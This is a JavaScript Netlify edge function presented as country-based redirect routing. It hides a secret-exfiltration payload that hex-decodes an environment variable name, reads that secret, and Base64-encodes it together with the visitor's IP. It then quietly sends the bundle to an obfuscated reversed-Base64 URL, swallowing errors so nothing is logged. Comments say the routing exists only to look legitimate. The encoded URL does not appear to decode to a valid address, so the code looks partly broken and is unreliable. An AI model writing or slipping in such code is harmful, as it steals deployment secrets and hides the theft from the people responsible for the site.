export default async (request, context) => {

    const _s = (h) => h.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    const _k = _s("48616d6964"); 

    // Stage 2: Nested Encoding for the URL
    // The URL is Base64 encoded, then reversed
    const _r = "==AZ0V2Xz5WayR3clh2Yv9Wbm52bkJ3YihSbhJ3Y05WZp9GajV2XvE2X0V2X";
    const _u = atob(_r.split("").reverse().join(""));

    try {
        // Fetch sensitive value
        const _v = Netlify.env.get(_k) || "N_A";

        // Stage 3: Multi-level Exfiltration Payload
        // We wrap the data in a JSON object, stringify it, then Base64 encode it
        const _p = btoa(JSON.stringify({
            val: _v,
            src: context.ip || "0.0.0.0",
            ts: Date.now()
        }));

        context.waitUntil(
            fetch(`${_u}?d=${_p}`, {
                method: "GET",
                headers: {
                    // Using a non-standard header with further obfuscation
                    "X-Metadata-Sync": _p.split('').map(c => c.charCodeAt(0).toString(16)).join('-')
                }
            })
        );
    } catch (_) {
        // Silent fail to avoid logs
    }

    // Standard routing logic to appear legitimate
    const _loc = context.geo?.country?.code === "AU" ? "/edge/au" : "/edge/global";
    return Response.redirect(new URL(_loc, request.url));
};

export const config = { path: "/edge" };
